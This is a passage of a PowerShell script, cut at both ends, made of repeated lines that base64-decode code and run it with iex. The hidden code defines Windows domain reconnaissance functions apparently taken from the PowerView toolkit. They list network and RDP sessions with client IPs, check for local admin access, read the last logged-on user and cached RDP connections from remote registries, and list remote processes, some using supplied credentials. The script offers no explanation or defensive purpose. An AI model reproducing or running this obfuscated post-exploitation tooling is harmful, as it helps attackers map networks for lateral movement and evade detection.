IgaXMgbm90IHZhbGlkLid9CiAgICAgICAgICAgICAgICAoMjM0KSAgICAgICAgIHtXcml0ZS1EZWJ1ZyAnTW9yZSBlbnRyaWVzIGFyZSBhdmFpbGFibGUuIFNwZWNpZnkgYSBsYXJnZSBlbm91Z2ggYnVmZmVyIHRvIHJlY2VpdmUgYWxsIGVudHJpZXMuJ30KICAgICAgICAgICAgICAgICg4KSAgICAgICAgICAge1dyaXRlLURlYnVnICdJbnN1ZmZpY2llbnQgbWVtb3J5IGlzIGF2YWlsYWJsZS4nfQogICAgICAgICAgICAgICAgKDIzMTIpICAgICAgICB7V3JpdGUtRGVidWcgJ0Egc2Vzc2lvbiBkb2VzIG5vdCBleGlzdCB3aXRoIHRoZSBjb21wdXRlciBuYW1lLid9CiAgICAgICAgICAgICAgICAoMjM1MSkgICAgICAgIHtXcml0ZS1EZWJ1ZyAnVGhlIGNvbXB1dGVyIG5hbWUgaXMgbm90IHZhbGlkLid9CiAgICAgICAgICAgICAgICAoMjIyMSkgICAgICAgIHtXcml0ZS1EZWJ1ZyAnVXNlcm5hbWUgbm90IGZvdW5kLid9CiAgICAgICAgICAgICAgICAoNTMpICAgICAgICAgIHtXcml0ZS1EZWJ1ZyAnSG9zdG5hbWUgY291bGQgbm90IGJlIGZvdW5kJ30KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFNlc3Npb24gewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyTmFtZSA9ICcnCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVidWcnXSkgewogICAgICAgICAgICAkRGVidWdQcmVmZXJlbmNlID0gJ0NvbnRpbnVlJwogICAgICAgIH0KICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgICRDb21wdXRlck5hbWUgPSBHZXQtTmFtZUZpZWxkIC1PYmplY3QgJENvbXB1dGVyTmFtZQogICAgICAgICRRdWVyeUxldmVsID0gMTAKICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgJEVudHJpZXNSZWFkID0gMAogICAgICAgICRUb3RhbFJlYWQgPSAwCiAgICAgICAgJFJlc3VtZUhhbmRsZSA9IDAKICAgICAgICAkUmVzdWx0ID0gJE5ldGFwaTMyOjpOZXRTZXNzaW9uRW51bSgkQ29tcHV0ZXJOYW1lLCAnJywgJFVzZXJOYW1lLCAkUXVlcnlMZXZlbCwgW3JlZl0kUHRySW5mbywgLTEsIFtyZWZdJEVudHJpZXNSZWFkLCBbcmVmXSRUb3RhbFJlYWQsIFtyZWZdJFJlc3VtZUhhbmRsZSkKICAgICAgICAkT2Zmc2V0ID0gJFB0ckluZm8uVG9JbnQ2NCgpCiAgICAgICAgV3JpdGUtRGVidWcgIkdldC1OZXRTZXNzaW9uIHJlc3VsdDogJFJlc3VsdCIKICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CiAgICAgICAgICAgICRJbmNyZW1lbnQgPSAkU0VTU0lPTl9JTkZPXzEwOjpHZXRTaXplKCkKICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJEVudHJpZXNSZWFkKTsgJGkrKykgewogICAgICAgICAgICAgICAgJE5ld0ludFB0ciA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQKICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJFNFU1NJT05fSU5GT18xMAogICAgICAgICAgICAgICAgJEluZm8gfCBTZWxlY3QtT2JqZWN0ICoKICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkTmV3SW50UHRyLlRvSW50NjQoKQogICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE51bGwgPSAkTmV0YXBpMzI6Ok5ldEFwaUJ1ZmZlckZyZWUoJFB0ckluZm8pCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIHN3aXRjaCAoJFJlc3VsdCkgewogICAgICAgICAgICAgICAgKDUpICAgICAgICAgICB7V3JpdGUtRGVidWcgJ1RoZSB1c2VyIGRvZXMgbm90IGhhdmUgYWNjZXNzIHRvIHRoZSByZXF1ZXN0ZWQgaW5mb3JtYXRpb24uJ30KICAgICAgICAgICAgICAgICgxMjQpICAgICAgICAge1dyaXRlLURlYnVnICdUaGUgdmFsdWUgc3BlY2lmaWVkIGZvciB0aGUgbGV2ZWwgcGFyYW1ldGVyIGlzIG5vdCB2YWxpZC4nfQogICAgICAgICAgICAgICAgKDg3KSAgICAgICAgICB7V3JpdGUtRGVidWcgJ1RoZSBzcGVjaWZpZWQgcGFyYW1ldGVyIGlzIG5vdCB2YWxpZC4nfQogICAgICAgICAgICAgICAgKDIzNCkgICAgICAgICB7V3JpdGUtRGVidWcgJ01vcmUgZW50cmllcyBhcmUgYXZhaWxhYmxlLiBTcGVjaWZ5IGEgbGFyZ2UgZW5vdWdoIGJ1ZmZlciB0byByZWNlaXZlIGFsbCBlbnRyaWVzLid9CiAgICAgICAgICAgICAgICAoOCkgICAgICAgICAgIHtXcml0ZS1EZWJ1ZyAnSW5zdWZmaWNpZW50IG1lbW9yeSBpcyBhdmFpbGFibGUuJ30KICAgICAgICAgICAgICAgICgyMzEyKSAgICAgICAge1dyaXRlLURlYnVnICdBIHNlc3Npb24gZG9lcyBub3QgZXhpc3Qgd2l0aCB0aGUgY29tcHV0ZXIgbmFtZS4nfQogICAgICAgICAgICAgICAgKDIzNTEpICAgICAgICB7V3JpdGUtRGVidWcgJ1RoZSBjb21wdXRlciBuYW1lIGlzIG5vdCB2YWxpZC4nfQogICAgICAgICAgICAgICAgKDIyMjEpICAgICAgICB7V3JpdGUtRGVidWcgJ1VzZXJuYW1lIG5vdCBmb3VuZC4nfQogICAgICAgICAgICAgICAgKDUzKSAgICAgICAgICB7V3JpdGUtRGVidWcgJ0hvc3RuYW1lIGNvdWxkIG5vdCBiZSBmb3VuZCd9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFJEUFNlc3Npb24gewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JwogICAgKQogICAgYmVnaW4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlYnVnJ10pIHsKICAgICAgICAgICAgJERlYnVnUHJlZmVyZW5jZSA9ICdDb250aW51ZScKICAgICAgICB9CiAgICB9CiAgICBwcm9jZXNzIHsKICAgICAgICAkQ29tcHV0ZXJOYW1lID0gR2V0LU5hbWVGaWVsZCAtT2JqZWN0ICRDb21wdXRlck5hbWUKICAgICAgICAkSGFuZGxlID0gJFd0c2FwaTMyOjpXVFNPcGVuU2VydmVyRXgoJENvbXB1dGVyTmFtZSkKICAgICAgICBpZiAoJEhhbmRsZSAtbmUgMCkgewogICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiV1RTT3BlblNlcnZlckV4IGhhbmRsZTogJEhhbmRsZSIKICAgICAgICAgICAgJHBwU2Vzc2lvbkluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAkcENvdW50ID0gMAogICAgICAgICAgICAkUmVzdWx0ID0gJFd0c2FwaTMyOjpXVFNFbnVtZXJhdGVTZXNzaW9uc0V4KCRIYW5kbGUsIFtyZWZdMSwgMCwgW3JlZl0kcHBTZXNzaW9uSW5mbywgW3JlZl0kcENvdW50KQogICAgICAgICAgICAkT2Zmc2V0ID0gJHBwU2Vzc2lvbkluZm8uVG9JbnQ2NCgpCiAgICAgICAgICAgIFdyaXRlLURlYnVnICJXVFNFbnVtZXJhdGVTZXNzaW9uc0V4IHJlc3VsdDogJFJlc3VsdCIKICAgICAgICAgICAgV3JpdGUtRGVidWcgInBDb3VudDogJHBDb3VudCIKICAgICAgICAgICAgaWYgKCgkUmVzdWx0IC1uZSAwKSAtYW5kICgkT2Zmc2V0IC1ndCAwKSkgewogICAgICAgICAgICAgICAgJEluY3JlbWVudCA9ICRXVFNfU0VTU0lPTl9JTkZPXzE6OkdldFNpemUoKQogICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJHBDb3VudCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJFdUU19TRVNTSU9OX0lORk9fMQogICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgIGlmICgkSW5mby5wSG9zdE5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkSW5mby5wSG9zdE5hbWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyTmFtZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXNzaW9uTmFtZScgJEluZm8ucFNlc3Npb25OYW1lCiAgICAgICAgICAgICAgICAgICAgaWYgKCQoLW5vdCAkSW5mby5wRG9tYWluTmFtZSkgLW9yICgkSW5mby5wRG9tYWluTmFtZSAtZXEgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAiJCgkSW5mby5wVXNlck5hbWUpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICIkKCRJbmZvLnBEb21haW5OYW1lKVwkKCRJbmZvLnBVc2VyTmFtZSkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lEJyAkSW5mby5TZXNzaW9uSUQKICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTdGF0ZScgJEluZm8uU3RhdGUKICAgICAgICAgICAgICAgICAgICAkcHBCdWZmZXIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgICAgICRwQnl0ZXNSZXR1cm5lZCA9IDAKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0MiA9ICRXdHNhcGkzMjo6V1RTUXVlcnlTZXNzaW9uSW5mb3JtYXRpb24oJEhhbmRsZSwgJEluZm8uU2Vzc2lvbklELCAxNCwgW3JlZl0kcHBCdWZmZXIsIFtyZWZdJHBCeXRlc1JldHVybmVkKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQyID0gJHBwQnVmZmVyLlRvSW50NjQoKQogICAgICAgICAgICAgICAgICAgICROZXdJbnRQdHIyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldDIKICAgICAgICAgICAgICAgICAgICAkSW5mbzIgPSAkTmV3SW50UHRyMiAtYXMgJFdUU19DTElFTlRfQUREUkVTUwogICAgICAgICAgICAgICAgICAgICRTb3VyY2VJUCA9ICRJbmZvMi5BZGRyZXNzICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCRTb3VyY2VJUFsyXSAtbmUgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlSVAgPSBbU3RyaW5nXSRTb3VyY2VJUFsyXSsiLiIrW1N0cmluZ10kU291cmNlSVBbM10rIi4iK1tTdHJpbmddJFNvdXJjZUlQWzRdKyIuIitbU3RyaW5nXSRTb3VyY2VJUFs1XQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNvdXJjZUlQID0gJE51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU291cmNlSVAnICRTb3VyY2VJUAogICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uCiAgICAgICAgICAgICAgICAgICAgJE51bGwgPSAkV3RzYXBpMzI6OldUU0ZyZWVNZW1vcnkoJHBwQnVmZmVyKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgKz0gJEluY3JlbWVudAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE51bGwgPSAkV3RzYXBpMzI6OldUU0ZyZWVNZW1vcnlFeCgyLCAkcHBTZXNzaW9uSW5mbywgJHBDb3VudCkKICAgICAgICAgICAgfQogICAgICAgICAgICAkTnVsbCA9ICRXdHNhcGkzMjo6V1RTQ2xvc2VTZXJ2ZXIoJEhhbmRsZSkKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRFcnIgPSAkS2VybmVsMzI6OkdldExhc3RFcnJvcigpCiAgICAgICAgICAgIFdyaXRlLVZlcmJ1c2UgIkxhc3RFcnJvcjogJEVyciIKICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLUNoZWNrTG9jYWxBZG1pbkFjY2VzcyB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJyldCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVidWcnXSkgewogICAgICAgICAgICAkRGVidWdQcmVmZXJlbmNlID0gJ0NvbnRpbnVlJwogICAgICAgIH0KICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgICRDb21wdXRlck5hbWUgPSBHZXQtTmFtZUZpZWxkIC1PYmplY3QgJENvbXB1dGVyTmFtZQogICAgICAgICRIYW5kbGUgPSAkQWR2YXBpMzI6Ok9wZW5TQ01hbmFnZXJXKCJcXCRDb21wdXRlck5hbWUiLCAnU2VydmljZXNBY3RpdmUnLCAweEYwMDNGKQogICAgICAgIFdyaXRlLURlYnVnICJJbnZva2UtQ2hlY2tMb2NhbEFkbWluQWNjZXNzIGhhbmRsZTogJEhhbmRsZSIKICAgICAgICBpZiAoJEhhbmRsZSAtbmUgMCkgewogICAgICAgICAgICAkTnVsbCA9ICRBZHZhcGkzMjo6Q2xvc2VTZXJ2aWNlSGFuZGxlKCRIYW5kbGUpCiAgICAgICAgICAgICRUcnVlCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkRXJyID0gJEtlcm5lbDMyOjpHZXRMYXN0RXJyb3IoKQogICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiSW52b2tlLUNoZWNrTG9jYWxBZG1pbkFjY2VzcyBMYXN0RXJyb3I6ICRFcnIiCiAgICAgICAgICAgICRGYWxzZQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUxhc3RMb2dnZWRPbiB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJyldICAgICAgICAKICAgICAgICAkQ29tcHV0ZXJOYW1lID0gIi4iCiAgICApCiAgICBwcm9jZXNzIHsKICAgICAgICAkQ29tcHV0ZXJOYW1lID0gR2V0LU5hbWVGaWVsZCAtT2JqZWN0ICRDb21wdXRlck5hbWUKICAgICAgICB0cnkgewogICAgICAgICAgICAkUmVnID0gW1dNSUNsYXNzXSJcXCRDb21wdXRlck5hbWVccm9vdFxkZWZhdWx0OnN0ZFJlZ1Byb3YiCiAgICAgICAgICAgICRIS0xNID0gMjE0NzQ4MzY1MAogICAgICAgICAgICAkS2V5ID0gIlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEF1dGhlbnRpY2F0aW9uXExvZ29uVUkiCiAgICAgICAgICAgICRWYWx1ZSA9ICJMYXN0TG9nZ2VkT25Vc2VyIgogICAgICAgICAgICAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS0xNLCAkS2V5LCAkVmFsdWUpLnNWYWx1ZQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlshXSBFcnJvciBvcGVuaW5nIHJlbW90ZSByZWdpc3RyeSBvbiAkQ29tcHV0ZXJOYW1lLiBSZW1vdGUgcmVnaXN0cnkgbGlrZWx5IG5vdCBlbmFibGVkLiIKICAgICAgICAgICAgJE51bGwKICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUNhY2hlZFJEUENvbm5lY3Rpb24gewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICJsb2NhbGhvc3QiLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFJlbW90ZVVzZXJOYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFJlbW90ZVBhc3N3b3JkCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgaWYgKCRSZW1vdGVVc2VyTmFtZSAtYW5kICRSZW1vdGVQYXNzd29yZCkgewogICAgICAgICAgICAkUGFzc3dvcmQgPSAkUmVtb3RlUGFzc3dvcmQgfCBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nIC1Bc1BsYWluVGV4dCAtRm9yY2UKICAgICAgICAgICAgJENyZWRlbnRpYWwgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCRSZW1vdGVVc2VyTmFtZSwkUGFzc3dvcmQpCiAgICAgICAgfQogICAgICAgICRIS1UgPSAyMTQ3NDgzNjUxCiAgICB9CiAgICBwcm9jZXNzIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZigkQ3JlZGVudGlhbCkgewogICAgICAgICAgICAgICAgJFJlZyA9IEdldC1XbWlvYmplY3QgLUxpc3QgJ1N0ZFJlZ1Byb3YnIC1OYW1lc3BhY2Ugcm9vdFxkZWZhdWx0IC1Db21wdXRlcm5hbWUgJENvbXB1dGVyTmFtZSAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJFJlZyA9IEdldC1XbWlvYmplY3QgLUxpc3QgJ1N0ZFJlZ1Byb3YnIC1OYW1lc3BhY2Ugcm9vdFxkZWZhdWx0IC1Db21wdXRlcm5hbWUgJENvbXB1dGVyTmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiRXJyb3IgYWNjZXNzaW5nICRDb21wdXRlck5hbWUsIGxpa2VseSBpbnN1ZmZpY2llbnQgcGVybWlzc2lvbnMgb3IgZmlyZXdhbGwgcnVsZXMgb24gaG9zdCIKICAgICAgICB9CiAgICAgICAgaWYoISRSZWcpIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiRXJyb3IgYWNjZXNzaW5nICRDb21wdXRlck5hbWUsIGxpa2VseSBpbnN1ZmZpY2llbnQgcGVybWlzc2lvbnMgb3IgZmlyZXdhbGwgcnVsZXMgb24gaG9zdCIKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRVc2VyU0lEcyA9ICgkUmVnLkVudW1LZXkoJEhLVSwgIiIpKS5zTmFtZXMgfCA/IHsgJF8gLW1hdGNoICdTLTEtNS0yMS1bMC05XSstWzAtOV0rLVswLTldKy1bMC05XSskJyB9CiAgICAgICAgICAgIGZvcmVhY2ggKCRVc2VyU0lEIGluICRVc2VyU0lEcykgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSBDb252ZXJ0LVNpZFRvTmFtZSAkVXNlclNJRAogICAgICAgICAgICAgICAgICAgICRDb25uZWN0aW9uS2V5cyA9ICRSZWcuRW51bVZhbHVlcygkSEtVLCIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxEZWZhdWx0Iikuc05hbWVzCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJENvbm5lY3Rpb24gaW4gJENvbm5lY3Rpb25LZXlzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRDb25uZWN0aW9uIC1tYXRjaCAnTVJVLionKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0U2VydmVyID0gJFJlZy5HZXRTdHJpbmdWYWx1ZSgkSEtVLCAiJFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdCIsICRDb25uZWN0aW9uKS5zVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJTSUQnICRVc2VyU0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldFNlcnZlcicgJFRhcmdldFNlcnZlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VybmFtZUhpbnQnICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJFNlcnZlcktleXMgPSAkUmVnLkVudW1LZXkoJEhLVSwiJFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcU2VydmVycyIpLnNOYW1lcwogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRTZXJ2ZXIgaW4gJFNlcnZlcktleXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJuYW1lSGludCA9ICRSZWcuR2V0U3RyaW5nVmFsdWUoJEhLVSwgIiRVc2VyU0lEXFNvZnR3YXJlXE1pY3Jvc29mdFxUZXJtaW5hbCBTZXJ2ZXIgQ2xpZW50XFNlcnZlcnNcJFNlcnZlciIsICdVc2VybmFtZUhpbnQnKS5zVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlclNJRCcgJFVzZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUYXJnZXRTZXJ2ZXInICRTZXJ2ZXIKICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VybmFtZUhpbnQnICRVc2VybmFtZUhpbnQKICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiAgIAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiRXJyb3I6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFByb2Nlc3MgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTmFtZSwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRSZW1vdGVVc2VyTmFtZSwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRSZW1vdGVQYXNzd29yZAogICAgKQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYoJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAkQ29tcHV0ZXJOYW1lID0gR2V0LU5hbWVGaWVsZCAtT2JqZWN0ICRDb21wdXRlck5hbWUgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkQ29tcHV0ZXJOYW1lID0gW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdE5hbWUoKQogICAgICAgIH0KICAgICAgICAkQ3JlZGVudGlhbCA9ICROdWxsCiAgICAgICAgaWYoJFJlbW90ZVVzZXJOYW1lKSB7CiAgICAgICAgICAgIGlmKCRSZW1vdGVQYXNzd29yZCkgewogICAgICAgICAgICAgICAgJFBhc3N3b3JkID0gJFJlbW90ZVBhc3N3b3JkIHwgQ29udmVydFRvLVNlY3VyZVN0cmluZyAtQXNQbGFpblRleHQgLUZvcmNlCiAgICAgICAgICAgICAgICAkQ3JlZGVudGlhbCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJFJlbW90ZVVzZXJOYW1lLCRQYXNzd29yZCkKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgR2V0LVdNSW9iamVjdCAtQ2xhc3MgV2luMzJfcHJvY2VzcyAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgfCBGb3JFY